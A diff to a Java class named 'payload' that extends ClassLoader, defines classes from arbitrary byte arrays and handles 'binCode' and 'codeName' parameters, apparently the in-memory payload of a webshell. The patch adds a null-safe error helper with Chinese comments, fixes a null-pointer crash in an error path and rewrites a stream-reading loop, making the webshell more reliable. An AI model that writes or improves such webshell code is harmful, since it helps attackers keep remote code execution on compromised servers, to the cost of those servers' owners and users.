@@ -68,6 +68,15 @@ public class payload extends ClassLoader {
         super(var1);
     }
 
+    /** getMessage() 可能为 null，保证返回可读的非空描述。 */
+    public static String describe(Throwable var0) {
+        if (var0 == null) {
+            return "unknown error";
+        }
+        String var1 = var0.getMessage();
+        return (var1 != null && var1.length() > 0) ? (var0.getClass().getName() + ": " + var1) : var0.getClass().getName();
+    }
+
     public Class defineClass(byte[] var1) {
         return super.defineClass((String)null, var1, 0, var1.length, this.getClass().getProtectionDomain());
     }
@@ -514,7 +523,9 @@ public class payload extends ClassLoader {
                 this.session.put(var2, var4);
                 return "ok".getBytes();
             } catch (Exception var5) {
-                return this.session.get(var2) != null ? "ok".getBytes() : var5.getMessage().getBytes();
+                // var5.getMessage() 可以是 null（很多 JDK 内部异常如此），
+                // 那时 .getBytes() 会 NPE，把真实原因整个盖掉。
+                return this.session.get(var2) != null ? "ok".getBytes() : describe(var5).getBytes();
             }
         } else {
             return "No parameter binCode,codeName".getBytes();
@@ -1079,10 +1090,8 @@ public class payload extends ClassLoader {
         int var4 = 0;
 
         try {
-            while(true) {
-                if ((var4 += var1.read(var3, var4, var3.length - var4)) < var3.length) {
-                    continue;
-                }
+            while (var4 < var3.length) {
+                var4 += var1.read(var3, var4, var3.length - var4);
             }
         } catch (IOException var6) {
         }
